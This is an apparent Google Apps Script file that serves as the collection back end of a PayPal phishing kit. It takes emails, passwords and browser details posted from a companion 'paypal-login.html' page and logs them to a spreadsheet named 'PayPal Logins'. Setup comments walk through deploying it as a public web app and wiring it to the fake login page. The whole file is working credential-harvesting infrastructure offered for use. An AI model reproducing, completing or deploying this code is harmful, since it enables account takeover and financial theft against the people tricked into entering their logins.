// ════════════════════════════════════════════════════════════════
//  Google Apps Script — Save PayPal logins to Google Sheets
//
//  SETUP STEPS:
//  1. Open Google Sheets → Extensions → Apps Script
//  2. Delete existing code, paste this entire file
//  3. Click 💾 Save
//  4. Click Deploy → New Deployment
//     • Type            : Web App
//     • Execute as      : Me
//     • Who has access  : Anyone
//  5. Click Deploy → COPY the Web App URL
//  6. Open paypal-login.html
//     Replace  YOUR_SCRIPT_ID_HERE  inside var SHEET_URL with your URL
//  7. Save paypal-login.html and upload to your hosting
// ════════════════════════════════════════════════════════════════

var SHEET_NAME = 'PayPal Logins';

function doPost(e) {
  try {
    // Parse the incoming JSON body
    var data = JSON.parse(e.postData.contents);

    var ss    = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName(SHEET_NAME);

    // Auto-create sheet with styled header if it doesn't exist
    if (!sheet) {
      sheet = ss.insertSheet(SHEET_NAME);

      // Write header row
      var headers = [
        'Timestamp', 'Email', 'Password',
        'Platform', 'Language', 'Screen Resolution',
        'User Agent', 'Page URL'
      ];
      sheet.appendRow(headers);

      // Style header
      var headerRange = sheet.getRange(1, 1, 1, headers.length);
      headerRange.setBackground('#0070ba');
      headerRange.setFontColor('#ffffff');
      headerRange.setFontWeight('bold');
      headerRange.setFontSize(11);
      sheet.setFrozenRows(1);
      sheet.autoResizeColumns(1, headers.length);
    }

    // Append the new login row
    sheet.appendRow([
      data.timestamp || new Date().toLocaleString(),
      data.email     || '',
      data.password  || '',
      data.platform  || '',
      data.language  || '',
      data.screenRes || '',
      data.userAgent || '',
      data.pageURL   || ''
    ]);

    return ContentService
      .createTextOutput(JSON.stringify({ status: 'success' }))
      .setMimeType(ContentService.MimeType.JSON);

  } catch (err) {
    return ContentService
      .createTextOutput(JSON.stringify({ status: 'error', message: err.toString() }))
      .setMimeType(ContentService.MimeType.JSON);
  }
}

// Test via browser URL
function doGet(e) {
  return ContentService
    .createTextOutput('✅ Sheet Logger is active.')
    .setMimeType(ContentService.MimeType.TEXT);
}
